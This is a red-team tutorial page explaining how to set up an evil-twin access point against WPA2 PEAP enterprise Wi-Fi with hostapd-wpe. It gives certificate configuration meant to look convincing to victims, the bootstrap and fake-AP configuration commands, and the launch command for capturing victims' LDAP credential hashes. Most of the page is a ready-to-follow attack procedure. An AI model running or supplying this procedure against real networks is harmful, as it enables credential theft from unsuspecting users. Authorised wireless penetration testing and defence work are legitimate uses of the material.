# WPA/WPA2 PEAP (Enterprise)

In networks with WPA2 PEAP which means Enterprise don't use a pre shared key, the users authenticate with the LDAP credentials. As the router or AP doesn't know if the credentials are correct or not, it delegate to a RADIUS server. The handshake can't not be capture because the authentication is not completed by the server so instead of capturing the handshake we will create a `EvilTwin` but in this case with authentication (Which we are interesting to capture, remember that there are LDAP credentials).

![WPA2 PEAP Message Exchange](../../.gitbook/assets/wpa2\_peap.gif)

## EvilTwin

To carry out this task, we are going to use `hostapd-wpe` software.

### Configuring Certificates

First we need to aclare that when the user will authenticate to our fake AP, some information about the certificate will be displayed, in order to cheat our víctims, the certificate will seems as much real as posible.

So we need to modify the following files:

* /etc/hostapd-wpe/certs/server.cnf

```
[server]
countryName             = ES
stateOrProvinceName     = Salamanca
localityName            = Salamanca
organizationName        = Red Team Inc.
emailAddress            = admin@redteam.com
commonName              = "Certificado de Red Team Inc."
```

* /etc/hostapd-wpe/certs/client.cnf

```
[client]
countryName             = ES
stateOrProvinceName     = Salamanca
localityName            = Salamanca
organizationName        = Red Team Inc.
emailAddress            = user@redteam.com
commonName              = user@redteam.com
```

* /etc/hostapd-wpe/certs/ca.cnf

```
[certificate_authority]
countryName             = ES
stateOrProvinceName     = Salamanca
localityName            = Salamanca
organizationName        = Red Team Inc.
emailAddress            = admin@redteam.com
commonName              = "Entidad certificadora de Red Team Inc."
```

Finally, we just need to create it with `bootstrap`.

```
/etc/hostapd-wpe/certs/bootstrap
```

### Configuring te Fake AP

Onced configured and created the certificates, the final step is to configure our FAKE AP. We need to create a backup of the default hostapd config file and modify it.

```
cp /etc/hostapd-wpe/hostapd-wpe.conf /etc/hostapd-wpe/redteam.conf
vim /etc/hostapd-wpe/redteam.conf

#Modify the following values:

interface=<IFACE>
ssid=<ESSID>
channel=<CHANNEL>
```

### Launch & wait for s3crets

Finally, just launch the `hostapd-wpe` indicating the modified configuration file.

```
hostapd-wpe /etc/hostapd-wpe/redteam.conf
```

When the victim falls into our trap, we can obtain their NETLM hash.
